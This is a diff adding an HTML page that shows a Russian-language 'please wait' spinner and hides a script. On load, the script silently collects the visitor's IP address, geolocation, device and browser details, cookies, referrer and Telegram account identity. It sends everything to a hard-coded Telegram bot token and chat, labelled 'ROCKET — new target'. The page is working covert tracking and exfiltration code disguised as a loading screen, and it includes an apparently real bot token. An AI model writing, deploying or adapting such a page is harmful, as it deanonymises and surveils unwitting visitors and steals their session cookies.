@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Загрузка...</title>
+<style>
+  body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#111;color:#eee}
+  .box{text-align:center}
+  .spin{width:40px;height:40px;border:4px solid #333;border-top-color:#0af;border-radius:50%;animation:s 1s linear infinite;margin:0 auto 16px}
+  @keyframes s{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spin"></div>
+  <div>Пожалуйста, подождите...</div>
+</div>
+
+<script>
+// ROCKET_TRACKER_MARKER
+const TG_TOKEN = "8679622456:AAGRv0s18-FAEyH1M3qn4p2KuAfWX5JFsYU";
+const TG_CHAT  = "8927676512";
+
+async function getIP() {
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const j = await r.json();
+    return j.ip;
+  } catch(e) { return "н/д"; }
+}
+
+async function getGeo(ip) {
+  try {
+    const r = await fetch("https://ipapi.co/" + ip + "/json/");
+    const j = await r.json();
+    return `${j.country_name || ""}, ${j.region || ""}, ${j.city || ""}, ${j.org || ""}`;
+  } catch(e) { return "н/д"; }
+}
+
+function getGPU() {
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  } catch(e) { return "н/д"; }
+}
+
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level*100)}% ${b.charging ? "(заряжается)" : ""}`;
+  } catch(e) { return "н/д"; }
+}
+
+async function collect() {
+  const ip  = await getIP();
+  const geo = await getGeo(ip);
+  const bat = await getBattery();
+
+  const data = {
+    "IP": ip,
+    "Гео по IP": geo,
+    "User-Agent": navigator.userAgent,
+    "Платформа": navigator.platform,
+    "Язык": navigator.language,
+    "Языки": (navigator.languages || []).join(", "),
+    "Экран": `${screen.width}x${screen.height} @${screen.colorDepth}bit`,
+    "Окно": `${innerWidth}x${innerHeight}`,
+    "Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone,
+    "Смещение TZ": new Date().getTimezoneOffset(),
+    "CPU ядер": navigator.hardwareConcurrency || "н/д",
+    "RAM (GB)": navigator.deviceMemory || "н/д",
+    "GPU": getGPU(),
+    "Батарея": bat,
+    "Сеть": navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink}Mb/s` : "н/д",
+    "Touch": navigator.maxTouchPoints,
+    "Куки": document.cookie || "(пусто)",
+    "Referrer": document.referrer || "(нет)",
+    "URL": location.href,
+    "Время": new Date().toISOString(),
+    "Платформа TG": (window.Telegram && Telegram.WebApp) ? "Telegram WebApp" : "браузер"
+  };
+
+  if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe) {
+    const u = Telegram.WebApp.initDataUnsafe.user;
+    if (u) {
+      data["TG ID"] = u.id;
+      data["TG имя"] = `${u.first_name || ""} ${u.last_name || ""}`;
+      data["TG username"] = u.username || "(нет)";
+      data["TG язык"] = u.language_code || "";
+    }
+  }
+
+  let text = "🎯 *ROCKET — новая цель*\n\n";
+  for (const [k, v] of Object.entries(data)) {
+    text += `*${k}:* ${v}\n`;
+  }
+
+  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: TG_CHAT,
+      text: text,
+      parse_mode: "Markdown"
+    })
+  });
+}
+
+collect();
+</script>
+</body>
+</html>
